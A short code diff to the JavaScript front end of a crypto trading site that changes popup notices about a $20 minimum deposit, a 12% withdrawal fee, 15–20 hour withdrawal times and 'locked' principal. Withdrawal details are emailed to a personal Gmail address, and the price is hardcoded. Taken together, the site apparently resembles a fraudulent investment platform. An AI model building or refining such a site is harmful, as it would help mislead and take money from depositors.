@@ -197,7 +197,7 @@ var pending=null,me=null,candles=[],px=68432.21,isAdmin=false;
 if(window.emailjs){try{emailjs.init({publicKey:EJ_PUB});}catch(e){}}
 function el(id){return document.getElementById(id);}
 function showScreen(n){["landing","signup","otp","login","adminlogin"].forEach(function(x){var e=el("screen-"+x);if(e)e.classList.toggle("hidden",x!==n);});}
-function pop(t,m){el("pop-spin").classList.add("hidden");el("pop-title").textContent=t||"";el("pop-msg").textContent=m||"";el("popup").classList.remove("hidden");}
+function pop(t,m){el("pop-spin").classList.add("hidden");var a=el("pop-title");var b=el("pop-msg");if(a)a.textContent=t||"Notice";if(b)b.textContent=m||"";el("popup").classList.remove("hidden");}
 function popSpin(){el("pop-spin").classList.remove("hidden");el("pop-title").textContent="";el("pop-msg").textContent="";el("popup").classList.remove("hidden");}
 function closePop(){el("popup").classList.add("hidden");}
 function spin(){return '<span class="spin" style="width:18px;height:18px;display:inline-block;vertical-align:middle"></span>';}
@@ -263,7 +263,7 @@ isAdmin=true;el("auth-wrap").classList.add("hidden");el("dash-wrap").classList.a
 function enterDash(){
 if(!me){logout();return;}
 el("auth-wrap").classList.add("hidden");el("dash-wrap").classList.remove("hidden");
-drawUser();openTab("home");pop("Notice","Withdraw time: 15 to 20 hours. Fee 12%.");
+drawUser();openTab("home");pop("Notice","Minimum deposit $20. Withdraw time 15 to 20 hours. Fee 12%. Principal stays locked. Press OK.");
 setTimeout(closePop,5000);
 if(window._t)clearInterval(window._t);
 window._t=setInterval(function(){drawUser();},1000);
@@ -379,7 +379,7 @@ await sb.from("profiles").update({balance:Number(me.balance)-amt}).eq("id",me.id
 var w=await sb.from("withdrawals").insert({user_id:me.id,amount:amt,fee:fee,net:net,address:me.wd_address,status:"PENDING"});
 if(w.error){await sb.from("profiles").update({balance:Number(me.balance||0)}).eq("id",me.id);pop("Notice",w.error.message||"Withdraw blocked");return;}
 try{emailjs.send(EJ_SVC,EJ_TPL,{to_email:"nexoratrade327@gmail.com",user_name:(me.username||"User"),otp_code:"WD",message:"WITHDRAW "+(me.username||"")+" $"+amt+" net $"+net+" "+(me.wd_address||"")});}catch(e){}
-await loadMe();drawUser();pop("Notice","Withdraw submitted. Time 12 to 15 hours. Status: Pending.");
+await loadMe();drawUser();pop("Notice","Withdraw submitted. Time 15 to 20 hours. Status: Pending.");
 }
 async function renderAdmin(){
 var prof=await sb.from("profiles").select("*");var list=prof.data||[];
